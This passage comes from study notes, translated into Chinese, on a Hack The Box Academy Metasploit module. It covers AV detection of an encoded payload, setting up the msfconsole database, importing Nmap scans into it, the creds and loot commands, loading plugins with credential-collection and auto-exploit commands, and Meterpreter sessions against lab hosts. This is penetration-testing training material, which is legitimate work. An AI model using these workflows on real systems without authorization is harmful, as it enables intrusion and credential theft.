 Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505
 SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430
 Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415
SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330
Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505
Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505
TACHYON               false     2022-05-05.02                                                                                                              20220505
Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505
TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505
TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505
VBA32                 false     5.0.0                                                                                                                      20220505
ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504
VirIT                 false     9.5.188                                                                                                                    20220504
Webroot               false     1.0.0.403                                                                                                                  20220505
Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428
Zillya                false     2.0.0.4625                                                                                                                 20220505
ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505
Zoner                 false     2.2.2.0                                                                                                                    20220504
tehtris               false     v0.1.2                                                                                                                     20220505
```

正如预期的那样，我们在实际环境中遇到的大多数杀毒产品仍然会检测到这个 payload（载荷），因此我们必须使用其他超出本模块范围的 AV（杀毒软件）规避方法。#metasploit #hacking #postgres [source](https://academy.hackthebox.com/module/39/section/411)

---

`msfconsole` 中的 `Databases`（数据库）用于跟踪你的结果。众所周知，即使在更复杂的机器评估过程中，更不用说整个网络了，由于搜索结果、入口点、发现的问题、发现的凭据等数量庞大，事情可能会变得有些模糊和复杂。

这就是数据库发挥作用的地方。`Msfconsole` 内置支持 PostgreSQL 数据库系统。通过它，我们可以直接、快速、轻松地访问扫描结果，并且能够与第三方工具结合导入和导出结果。数据库条目还可以用于直接使用现有发现来配置 Exploit（漏洞利用）模块参数。

---

## 设置数据库

首先，我们必须确保 PostgreSQL 服务器在我们的主机上运行。为此，输入以下命令：

#### PostgreSQL 状态

PostgreSQL Status

```shell-session
tr01ax@htb[/htb]$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2147 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
```

#### 启动 PostgreSQL

Start PostgreSQL

```shell-session
tr01ax@htb[/htb]$ sudo systemctl start postgresql
```

启动 PostgreSQL 后，我们需要使用 `msfdb init` 创建和初始化 MSF 数据库。

#### MSF - 初始化数据库

MSF - Initiate a Database

```shell-session
tr01ax@htb[/htb]$ sudo msfdb init

[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8>
Did you mean? with_options

<SNIP>
```

如果 Metasploit 不是最新版本，有时会出现错误。导致错误的这种差异可能有多种原因。首先，更新 Metasploit（`apt update`）通常有助于解决此问题。然后我们可以尝试重新初始化 MSF 数据库。

MSF - Initiate a Database

```shell-session
tr01ax@htb[/htb]$ sudo msfdb init

[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

如果初始化被跳过，并且 Metasploit 告诉我们数据库已经配置，我们可以重新检查数据库的状态。

MSF - Initiate a Database

```shell-session
tr01ax@htb[/htb]$ sudo msfdb status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2476 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.

COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)
postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)

 UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
```

如果这个错误没有出现（这在全新安装 Metasploit 后经常发生），那么我们在初始化数据库时将看到以下内容：

MSF - Initiate a Database

```shell-session
tr01ax@htb[/htb]$ sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

数据库初始化后，我们可以启动 `msfconsole` 并同时连接到创建的数据库。

#### MSF - 连接到已初始化的数据库

MSF - Connect to the Initiated Database

```shell-session
tr01ax@htb[/htb]$ sudo msfdb run

[i] Database already started

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6>
```

但是，如果我们已经配置了数据库并且无法更改 MSF 用户名的密码，请继续执行以下命令：

#### MSF - 重新初始化数据库

MSF - Reinitiate the Database

```shell-session
tr01ax@htb[/htb]$ msfdb reinit
tr01ax@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
tr01ax@htb[/htb]$ sudo service postgresql restart
tr01ax@htb[/htb]$ msfconsole -q

msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```

现在，我们可以开始了。`msfconsole` 还提供了数据库的集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。

#### MSF - 数据库选项

MSF - Database Options

```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

---

## 使用数据库

借助数据库，我们可以管理许多不同的类别和我们分析过的主机。或者，使用 Metasploit 与它们交互时获得的相关信息。这些数据库可以导出和导入。当我们有大量的主机、战利品、笔记以及这些主机的存储漏洞列表时，这特别有用。确认数据库已成功连接后，我们可以组织我们的 `Workspaces`（工作区）。

#### 工作区

我们可以将 `Workspaces`（工作区）想象成项目中的文件夹。我们可以按 IP、子网、网络或域来分隔不同的扫描结果、主机和提取的信息。

要查看当前的工作区列表，请使用 `workspace` 命令。在命令后添加 `-a` 或 `-d` 开关，然后是工作区的名称，将分别 `添加` 或 `删除` 该工作区到数据库。

Workspaces

```shell-session
msf6 > workspace

* default
```

请注意，默认工作区名为 `default`，根据 `*` 符号表示当前正在使用。输入 `workspace [name]` 命令来切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。

Workspaces

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

要查看我们还可以对工作区执行哪些操作，我们可以使用 `workspace -h` 命令获取与工作区相关的帮助菜单。

Workspaces

```shell-session
msf6 > workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```

---

## 导入扫描结果

接下来，假设我们想将主机的 `Nmap scan`（Nmap 扫描）导入到数据库的工作区中，以便更好地了解目标。我们可以使用 `db_import` 命令来完成此操作。导入完成后，我们可以使用 `hosts` 和 `services` 命令检查数据库中主机信息的存在。请注意，`db_import` 首选 `.xml` 文件类型。

#### 存储的 Nmap 扫描

Stored Nmap Scan

```shell-session
tr01ax@htb[/htb]$ cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds
```

#### 导入扫描结果

Importing Scan Results

```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

---

## 在 MSFconsole 中使用 Nmap

或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台运行或退出进程，请使用 `db_nmap` 命令。

#### MSF - Nmap

MSF - Nmap

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device
10.10.10.40             Unknown                    device


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

---

## 数据备份

完成会话后，请确保备份我们的数据，以防 PostgreSQL 服务出现问题。为此，请使用 `db_export` 命令。

#### MSF - 数据库导出

MSF - DB Export

```shell-session
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified


msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

这些数据可以在需要时稍后导入回 msfconsole。与数据保留相关的其他命令是 `hosts`、`services` 以及 `creds` 和 `loot` 命令的扩展用法。

---

## 主机

`hosts` 命令显示一个数据库表，该表会自动填充我们在扫描和交互过程中发现的主机地址、主机名和其他信息。例如，假设 `msfconsole` 与可以执行服务和操作系统检测的扫描器插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，此信息应自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下帮助我们。

主机也可以作为单独的条目手动添加到此表中。添加自定义主机后，我们还可以组织表的格式和结构、添加注释、更改现有信息等。

#### MSF - 存储的主机

MSF - Stored Hosts

```shell-session
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```

---

## 服务

`services` 命令的功能与前一个命令相同。它包含一个表，其中包含扫描或交互期间发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。

#### MSF - 存储的主机服务

MSF - Stored Services of Hosts

```shell-session
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       从搜索结果设置 RHOSTS
  -S,--search       用于过滤的搜索字符串
  -U,--update       更新现有服务的数据

可用列: created_at, info, name, port, proto, state, updated_at
```

---

## 凭据（Credentials）

`creds` 命令允许你查看在与目标主机交互过程中收集的凭据。我们还可以手动添加凭据、将现有凭据与端口规范匹配、添加描述等。

#### MSF - 已存储的凭据

MSF - Stored Credentials

```shell-session
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type.
    realm     :  Realm,
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283

General options
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
                        If the file name ends in '.jtr', that format will be used.
                        If file name ends in '.hcat', the hashcat format will be used.
                        CSV by default.
  -d,--delete           Delete one or more credentials

Filter options for listing
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds that match the following types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results of the search
  -v,--verbose          Don't truncate long password hashes

Examples, John the Ripper hash types:
  Operating Systems (starts with)
    Blowfish ($2a$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($1$)    : md5
    SHA256   ($5$)    : sha256,crypt
    SHA512   ($6$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL 2005        : mssql05
    MSSQL 2012/2014   : mssql12
    MySQL < 4.1       : mysql
    MySQL >= 4.1      : mysql-sha1
    Oracle            : des,oracle
    Oracle 11         : raw-sha1,oracle11
    Oracle 11 (H type): dynamic_1506
    Oracle 12c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -O 1.2.3.4/24 # Return credentials with origins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```

---

## 战利品（Loot）

`loot` 命令与上述命令配合使用，为你提供已拥有服务和用户的一览表。这里的战利品指的是来自不同系统类型的哈希转储，包括 hashes、passwd、shadow 等。

#### MSF - 已存储的战利品

MSF - Stored Loot

```shell-session
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```#metasploit #hacking [source](https://academy.hackthebox.com/module/39/section/413)

---

插件（Plugins）是由第三方发布的现成软件，其创建者已授权 Metasploit 的开发人员将其软件集成到框架中。这些可以是具有免费使用的 `社区版`（Community Edition）但功能有限的商业产品，也可以是个人开发的独立项目。

插件的使用使渗透测试人员的工作更加轻松，将知名软件的功能引入 `msfconsole` 或 Metasploit Pro 环境。以前我们需要在不同软件之间切换来导入和导出结果，反复设置选项和参数，而现在，通过使用插件，所有内容都会由 msfconsole 自动记录到我们使用的数据库中，主机、服务和漏洞对用户来说一目了然。[插件](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin)直接与 API 配合工作，可用于操作整个框架。它们可用于自动化重复任务、向 `msfconsole` 添加新命令以及扩展这个已经非常强大的框架。

---

## 使用插件

要开始使用插件，我们需要确保它安装在机器上的正确目录中。导航到 `/usr/share/metasploit-framework/plugins`，这是每次新安装 `msfconsole` 的默认目录，应该可以显示我们可用的插件：

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/metasploit-framework/plugins

aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```

如果在这里找到了插件，我们可以在 `msfconsole` 中启动它，并会看到该特定插件的欢迎输出，表明它已成功加载并可以使用：

#### MSF - 加载 Nessus

MSF - Load Nessus

```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus


msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password

Policy Commands
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```

如果插件未正确安装，我们在尝试加载时会收到以下错误。

MSF - Load Nessus

```shell-session
msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```

要开始使用插件，请开始使用该特定插件帮助菜单中提供的命令。每个跨平台集成都为我们提供了一组独特的交互方式，可在评估期间使用，因此在使用它们之前阅读相关文档会很有帮助，以便充分利用这些触手可及的功能。

---

## 安装新插件

随着 Parrot OS 发行版的每次更新，新的、更流行的插件会随着制作者向公众发布而被安装，这些都收集在 Parrot 更新仓库中。要安装发行版更新中未包含的新自定义插件，我们可以将制作者页面上提供的 .rb 文件以适当的权限放置在 `/usr/share/metasploit-framework/plugins` 文件夹中。

例如，让我们尝试安装 [DarkOperator 的 Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git)。按照上面的链接，我们会得到几个 Ruby（`.rb`）文件，可以直接放置在上述文件夹中。

#### 下载 MSF 插件

Downloading MSF Plugins

```shell-session
tr01ax@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
tr01ax@htb[/htb]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

这里我们以 `pentest.rb` 插件为例，将其复制到 `/usr/share/metasploit-framework/plugins`。

#### MSF - 将插件复制到 MSF

MSF - Copying Plugin to MSF

```shell-session
tr01ax@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

之后，启动 `msfconsole` 并通过运行 `load` 命令检查插件的安装。插件加载后，`msfconsole` 的 `帮助菜单` 会自动扩展额外的功能。

#### MSF - 加载插件

MSF - Load Plugin

```shell-session
tr01ax@htb[/htb]$ msfconsole -q

msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/

Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest


msf6 > help

Tradecraft Commands
===================

    Command          Description
    -------          -----------
    check_footprint  Checks the possible footprint of a post module on a target system.


auto_exploit Commands
=====================

    Command           Description
    -------           -----------
    show_client_side  Show matched client side exploits from data imported from vuln scanners.
    vuln_exploit      Runs exploits based on data imported from vuln scanners.


Discovery Commands
==================

    Command                 Description
    -------                 -----------
    discover_db             Run discovery modules against current hosts in the database.
    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.
    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.
    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.


Project Commands
================

    Command       Description
    -------       -----------
    project       Command for managing projects.


Postauto Commands
=================

    Command             Description
    -------             -----------
    app_creds           Run application password collection modules against specified sessions.
    get_lhost           List local IP addresses that can be used for LHOST.
    multi_cmd           Run shell command against several sessions
    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.
    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.
    multi_post          Run a post module against specified sessions.
    multi_post_rc       Run resource file with post modules and options against specified sessions.
    sys_creds           Run system password collection modules against specified sessions.

<SNIP>
```

许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的用途，在熟悉之后可以成为节省时间的绝佳帮手。查看下面的流行插件列表：

||||
|---|---|---|
|[nMap (pre-installed)](https://nmap.org)|[NexPose (pre-installed)](https://sectools.org/tool/nexpose/)|[Nessus (pre-installed)](https://www.tenable.com/products/nessus)|
|[Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)|[Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)|[Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)|
|[Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)|[Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)|[Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)|

---

## Mixins（混入）

Metasploit 框架是用 Ruby 编写的，这是一种面向对象的编程语言。这在很大程度上使 `msfconsole` 变得出色易用。Mixins 是其中一个功能，一旦实现，就能为脚本创建者和用户提供极大的灵活性。

Mixins 是作为方法供其他类使用的类，而不必成为这些其他类的父类。因此，将其称为继承（inheritance）是不恰当的，而应该称为包含（inclusion）。它们主要在以下情况下使用：

1. 想为一个类提供大量可选功能。
2. 想为多个类使用一个特定功能。

大部分 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念通过使用 `include` 关键字来实现，我们将模块名称作为 `参数` 传递给它。我们可以在[这里](https://en.wikibooks.org/wiki/Metasploit/UsingMixins)阅读更多关于 mixins 的内容。

如果我们刚开始使用 Metasploit，不必担心 Mixins 的使用或其对评估的影响。然而，这里提到它们是为了说明 Metasploit 的自定义可以变得多么复杂。#metasploit #hacking #meterpreter [source](https://academy.hackthebox.com/module/39/section/415)


MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 `会话`（Sessions）来完成的，为所有已部署的模块创建专用的控制接口。

一旦创建了多个会话，我们可以在它们之间切换，并将不同的模块链接到其中一个后台会话以在其上运行，或将它们转换为作业（jobs）。请注意，一旦会话被置于后台，它将继续运行，我们与目标主机的连接将持续存在。但是，如果在载荷运行时出现问题导致通信通道断开，会话可能会终止。

---

## 使用会话

在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们与目标主机形成通信通道，我们就可以将会话置于后台。这可以通过按 `[CTRL] + [Z]` 组合键或在 Meterpreter 阶段输入 `background` 命令来完成。这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符（`msf6 >`），并能立即启动不同的模块。

#### 列出活动会话

我们可以使用 `sessions` 命令查看当前活动的会话。

Listing Active Sessions

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### 与会话交互

你可以使用 `sessions -i [编号]` 命令打开特定会话。

Interacting with a Session

```shell-session
